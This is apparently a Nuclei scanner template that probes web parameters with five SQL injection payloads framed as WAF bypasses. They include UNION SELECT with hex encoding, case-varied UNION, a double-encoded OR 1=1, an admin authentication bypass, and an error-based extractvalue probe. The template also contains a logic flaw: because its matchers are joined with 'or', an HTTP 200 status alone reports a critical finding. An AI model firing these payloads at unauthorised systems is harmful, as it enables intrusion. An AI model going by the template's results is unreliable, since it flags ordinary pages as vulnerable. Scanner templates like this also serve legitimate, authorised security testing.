id: ultimate-sqli-pwn

info:
  name: Advanced SQL Injection WAF Bypass
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      # 1. Hex Encoding & Inline Comments Bypass
      - "{{BaseURL}}/?id=1%27%20UNION%20SELECT%20NULL,NULL,CONCAT(0x73,0x71,0x6c,0x69,0x2d,0x66,0x6f,0x75,0x6e,0x64)--"
      
      # 2. Case Variation & Logical Bypass
      - "{{BaseURL}}/?q=1%27%20uNiOn%20SeLeCt%201,2,3,4--+- "
      
      # 3. Double Encoding & Error Trigger
      - "{{BaseURL}}/?id=1%2527%20OR%201=1-- "
      
      # 4. Auth Bypass Payload
      - "{{BaseURL}}/?user=admin%27%20AND%20%271%27=%271"
      
      # 5. Advanced Error-Based (No Sleep)
      - "{{BaseURL}}/?search=test%27%20AND%20extractvalue(1,concat(0x7e,(select%20'sqli-found'),0x7e))--"

    matchers-condition: or
    matchers:
      # Custom tag 'sqli-found' detection
      - type: word
        name: sqli-found
        part: body
        words:
          - "sqli-found"
          - "XPATH syntax error: '~sqli-found~'"

      # Standard DB Error Detection
      - type: regex
        name: sqli-found
        part: body
        regex:
          - "(?i)(SQL syntax|mysql_fetch_array|PostgreSQL query failed|ORA-00933|SQLServer JDBC Driver)"

      # Status check to ensure page loaded
      - type: status
        status:
          - 200
